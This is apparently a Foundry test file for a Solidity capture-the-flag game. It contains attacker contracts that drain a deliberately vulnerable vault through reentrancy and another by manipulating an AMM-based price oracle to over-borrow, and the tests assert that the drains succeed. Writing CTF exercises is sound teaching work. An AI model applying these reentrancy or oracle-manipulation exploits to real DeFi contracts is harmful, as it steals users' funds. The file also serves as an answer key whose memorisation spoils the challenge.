// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";

import {CTFFactory} from "../src/CTFFactory.sol";
import {TRACE} from "../src/TRACE.sol";
import {MKT} from "../src/MKT.sol";

import {Level1_Reentrancy} from "../src/Level1_Reentrancy.sol";
import {Level2_OracleManipulation} from "../src/Level2_OracleManipulation.sol";

import {SimpleAMM} from "../src/SimpleAMM.sol";
import {VulnerableOracle} from "../src/VulnerableOracle.sol";


contract Level1Attacker {
    Level1_Reentrancy public vault;
    TRACE public trace;

    constructor(
        Level1_Reentrancy _vault,
        TRACE _trace
    ) {
        vault = _vault;
        trace = _trace;
    }

    function attack(uint256 amount) external {
        trace.approve(address(vault), amount);
        vault.deposit(amount);
        vault.withdraw();
    }

    function onTRCReceived(uint256) external {
        if (trace.balanceOf(address(vault)) > 0) {
            vault.withdraw();
        }
    }
}


contract Level2Attacker {
    Level2_OracleManipulation public vault;
    SimpleAMM public amm;
    MKT public mkt;
    TRACE public trace;

    constructor(
        Level2_OracleManipulation _vault,
        SimpleAMM _amm,
        MKT _mkt,
        TRACE _trace
    ) {
        vault = _vault;
        amm = _amm;
        mkt = _mkt;
        trace = _trace;
    }

    function attack() external {
        // Use 40 TRC to manipulate the AMM price.
        trace.approve(
            address(amm),
            40 ether
        );

        amm.swapTRACEForMKT(
            40 ether
        );

        // Deposit 10 MKT as collateral.
        mkt.approve(
            address(vault),
            10 ether
        );

        vault.deposit(
            10 ether
        );

        // Borrow the entire 100 TRC vault.
        vault.borrow(
            100 ether
        );
    }
}


contract Level2OracleManipulationTest is Test {

    CTFFactory public factory;
    TRACE public trace;

    address public player = address(0x1234);

    function setUp() public {
        factory = new CTFFactory(
            address(
                0x1111222233334444555566667777888899990000
            )
        );

        trace = factory.trace();

        vm.deal(
            player,
            1 ether
        );
    }


    function test_CannotDeployBeforeLevel1Solved() public {
        vm.startPrank(player);

        vm.expectRevert(
            "Must solve Level 1 first"
        );

        factory.deployLevel2();

        vm.stopPrank();
    }


    function test_OracleManipulation() public {

        vm.startPrank(player);

        // ==================================================
        // STEP 1: Solve Level 1
        // ==================================================

        factory.claimTokens();

        address level1Address =
            factory.deployLevel1();

        Level1_Reentrancy level1 =
            Level1_Reentrancy(
                level1Address
            );

        Level1Attacker attacker =
            new Level1Attacker(
                level1,
                trace
            );

        // Give attacker 1 TRC.
        trace.transfer(
            address(attacker),
            1 ether
        );

        attacker.attack(
            1 ether
        );

        assertEq(
            trace.balanceOf(
                address(level1)
            ),
            0
        );

        factory.validateLevel1();

        assertTrue(
            factory.isSolved(
                1,
                player
            )
        );


        // ==================================================
        // STEP 2: Deploy Level 2
        // ==================================================

        address level2Address =
            factory.deployLevel2();

        Level2_OracleManipulation vault =
            Level2_OracleManipulation(
                level2Address
            );


        // ==================================================
        // STEP 3: Get MKT / AMM / ORACLE
        // ==================================================

        MKT mkt =
            MKT(
                address(
                    vault.mkt()
                )
            );

        VulnerableOracle oracle =
            vault.oracle();

        SimpleAMM amm =
            oracle.amm();


        // ==================================================
        // STEP 4: Check initial setup
        // ==================================================

        // Player starts with 10 MKT.
        assertEq(
            mkt.balanceOf(player),
            10 ether
        );


        // Vault contains 100 TRC.
        assertEq(
            trace.balanceOf(
                address(vault)
            ),
            100 ether
        );

        // Initial AMM:
        //
        // 10 MKT
        // 10 TRC
        //
        // Therefore:
        //
        // 1 MKT = 1 TRC

        assertEq(
            oracle.getPrice(),
            1 ether
        );


        // ==================================================
        // STEP 5: Create attacker
        // ==================================================

        Level2Attacker level2Attacker =
            new Level2Attacker(
                vault,
                amm,
                mkt,
                trace
            );

        // Give attacker the player's
        // Level 2 assets.
        trace.transfer(
            address(level2Attacker),
            40 ether
        );

        mkt.transfer(
            address(level2Attacker),
            10 ether
        );


        // ==================================================
        // STEP 6: Manipulate oracle
        // ==================================================

        level2Attacker.attack();


        // ==================================================
        // STEP 7: Check manipulated price
        // ==================================================

        // AMM should now approximately be:
        //
        // 2 MKT
        // 50 TRC
        //
        // Therefore:
        //
        // 1 MKT = 25 TRC

        assertEq(
            oracle.getPrice(),
            25 ether
        );


        // ==================================================
        // STEP 8: Vault should be drained
        // ==================================================

        assertEq(
            trace.balanceOf(
                address(vault)
            ),
            0
        );

        assertTrue(
            vault.isComplete()
        );


        // ==================================================
        // STEP 9: Validate Level 2
        // ==================================================

        factory.validateLevel2();

        assertTrue(
            factory.isSolved(
                2,
                player
            )
        );

        assertEq(
            factory.badgeContract().balanceOf(
                player,
                2
            ),
            1
        );

        vm.stopPrank();
    }
}